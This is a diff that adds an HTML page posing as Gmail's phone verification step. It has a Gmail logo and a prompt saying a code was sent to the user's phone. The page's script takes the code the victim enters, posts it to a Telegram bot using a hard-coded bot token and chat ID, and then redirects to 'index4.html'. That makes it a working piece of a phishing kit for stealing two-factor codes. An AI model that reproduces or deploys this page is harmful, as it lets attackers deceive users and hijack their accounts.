@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phone Verification</title>
+  <style>
+    /* General Styles */
+    #image {
+      width: 150px;
+      position: relative;
+      right: 150px;
+    }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #202124;
+      color: #e8eaed;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #1a1a1a;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+      width: 400px;
+      text-align: center;
+    }
+    h1 {
+      margin: 0;
+      font-size: 1.8rem;
+      font-weight: 400;
+    }
+    p {
+      font-size: 0.9rem;
+      margin-top: 8px;
+      color: #9aa0a6;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 0.9rem;
+      color: #e8eaed;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      font-size: 1rem;
+      border: 1px solid #5f6368;
+      border-radius: 4px;
+      background-color: #303134;
+      color: #e8eaed;
+      outline: none;
+    }
+    input:focus {
+      border-color: #8ab4f8;
+    }
+    .next-btn {
+      background-color: #1a73e8;
+      color: #fff;
+      font-size: 1rem;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .next-btn:hover {
+      background-color: #1767d3;
+    }
+    #timer {
+      margin-top: 20px;
+      font-size: 1rem;
+      color: #e8eaed;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="form-box">
+      <img id="image" src="Gmail-Embleme.png" alt="where">
+      <h1>Verification</h1>
+      <label for="code">We sent a code to your phone number</label>
+
+      <!-- Step 1: Verification Code -->
+      <form id="code-form">
+        <div id="code-group">
+          <input type="text" id="code" name="code" required>
+        </div>
+        <button type="submit" id="next-btn" class="next-btn">Next</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById("code-form");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const code = document.getElementById("code").value.trim();
+
+      if (!code) {
+        alert("Please enter the verification code.");
+        return;
+      }
+
+      // Telegram Bot Token and Chat ID
+      const botToken = "7383966150:AAGah2nvpeGL3UhA9bzfjGRBRFfcSOBt57s"; // Replace with your bot token
+      const chatId = "7410515457"; // Replace with your chat ID
+
+      // Create the message to send
+      const message = `📞 Verification Code:\nCode: ${code}`;
+
+      // Send the message via Telegram API
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+
+        if (response.ok) {
+          // Redirect to the next page after successful submission
+          window.location.href = "index4.html";
+        } else {
+          alert("Failed to send message. Please try again.");
+        }
+      } catch (error) {
+        console.error("Error:", error);
+        alert("An error occurred. Please try again.");
+      }
+    });
+  </script>
+</body>
+</html>
